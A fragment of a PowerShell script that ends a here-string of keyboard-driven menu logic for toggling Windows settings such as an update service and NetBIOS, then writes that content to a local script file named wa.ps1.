    if ($res.VirtualKeyCode -eq 40) { $c = $Global:MenuSelection; if ($c-eq 0){$Global:MenuSelection=1} elseif($c-eq 1){$Global:MenuSelection=0} else {$Global:MenuSelection = $c + 1}; continue }
    if ($res.VirtualKeyCode -eq 27) { Clear-Host; if ($Global:MenuSelection -ge 2) { $Global:MenuSelection = 1; continue } else { break } }
    if ($res.Character -eq ' ' -or $res.VirtualKeyCode -eq 32) { $t = $Global:MenuSelection; if ($t-eq 1){$Global:MenuSelection=2} elseif($t-eq 2){$Global:MenuSelection=3} elseif($t-eq 4){$Global:Toggle_MUpdateService=if($Global:Toggle_MUpdateService-eq 1){0}else{1}} elseif($t-eq 7){$Global:Toggle_GetUpToDate=if($Global:Toggle_GetUpToDate-eq 1){0}else{1}} elseif($t-eq 13){$Global:Toggle_NetBIOS=if($Global:Toggle_NetBIOS-eq 1){0}else{1}}; continue }
}
'@

$content | Set-Content -Path "C:\Users\admin\src\github.com\KeithOwns\wa\wa.ps1" -Force
